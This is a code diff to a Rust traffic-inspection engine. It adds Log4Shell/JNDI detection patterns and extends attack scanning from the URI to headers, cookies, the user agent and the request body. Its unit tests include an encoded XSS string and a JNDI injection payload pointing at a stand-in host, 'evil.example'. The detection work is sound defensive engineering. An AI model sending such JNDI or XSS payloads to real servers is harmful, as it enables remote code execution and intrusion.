@@ -258,6 +258,15 @@ fn detect_web_attack(s: &str) -> Option<(DetectionType, &'static str)> {
     {
         return Some((DetectionType::Xss, "Cross-site scripting"));
     }
+    // Log4Shell / JNDI injection — typically arrives in a header (User-Agent,
+    // X-Forwarded-For, ...), which is why scanning headers matters.
+    if s.contains("${jndi")
+        || s.contains("jndi:ldap")
+        || s.contains("jndi:rmi")
+        || s.contains("jndi:dns")
+    {
+        return Some((DetectionType::ExploitAttempt, "Log4Shell/JNDI"));
+    }
     let sqli = (s.contains("union") && s.contains("select"))
         || (s.contains("select") && s.contains(" from "))
         || s.contains("' or ")
@@ -821,15 +830,37 @@ impl WorkerThread {
                     for proto_event in proto_events {
                         match &proto_event {
                             ProtocolEvent::Http(tx) => {
-                                // Inspect the URL-decoded, lowercased URI so an
-                                // encoded payload (%27, %20, +, mixed case) is not
-                                // hidden from the keyword match — the raw check
-                                // missed exactly that.
-                                if let Some((dtype, label)) = tx
-                                    .request
-                                    .as_ref()
-                                    .and_then(|r| detect_web_attack(&normalize_uri(&r.uri)))
-                                {
+                                // Decode + scan every field an attack can ride in:
+                                // the URI, all header values, and the body. Each is
+                                // URL-decoded and lowercased so an encoded or
+                                // mixed-case payload (%27, +, ${jndi:...} in a
+                                // header) is not hidden from the keyword match.
+                                let hit = tx.request.as_ref().and_then(|r| {
+                                    detect_web_attack(&normalize_uri(&r.uri))
+                                        .or_else(|| {
+                                            r.headers
+                                                .values()
+                                                .find_map(|v| detect_web_attack(&normalize_uri(v)))
+                                        })
+                                        .or_else(|| {
+                                            r.user_agent
+                                                .as_deref()
+                                                .and_then(|v| detect_web_attack(&normalize_uri(v)))
+                                        })
+                                        .or_else(|| {
+                                            r.cookie
+                                                .as_deref()
+                                                .and_then(|v| detect_web_attack(&normalize_uri(v)))
+                                        })
+                                        .or_else(|| {
+                                            (!r.body.is_empty()).then(|| ()).and_then(|_| {
+                                                detect_web_attack(&normalize_uri(
+                                                    &String::from_utf8_lossy(&r.body),
+                                                ))
+                                            })
+                                        })
+                                });
+                                if let Some((dtype, label)) = hit {
                                     let uri = tx.request.as_ref().map(|r| r.uri.clone()).unwrap_or_default();
                                     analysis.add_event(
                                         DetectionEvent::new(
@@ -1361,6 +1392,11 @@ mod tests {
             detect_web_attack(&normalize_uri("/s?q=%3CScRiPt%3Ealert(1)%3C/script%3E"))
                 .map(|(t, _)| t),
             Some(DetectionType::Xss)
+        );
+        // Log4Shell / JNDI — typically in a header value, mixed case.
+        assert_eq!(
+            detect_web_attack(&normalize_uri("${jndi:LDAP://evil.example/a}")).map(|(t, _)| t),
+            Some(DetectionType::ExploitAttempt)
         );
         // Benign requests are not flagged.
         assert!(detect_web_attack(&normalize_uri("/index.html?page=2&sort=name")).is_none());
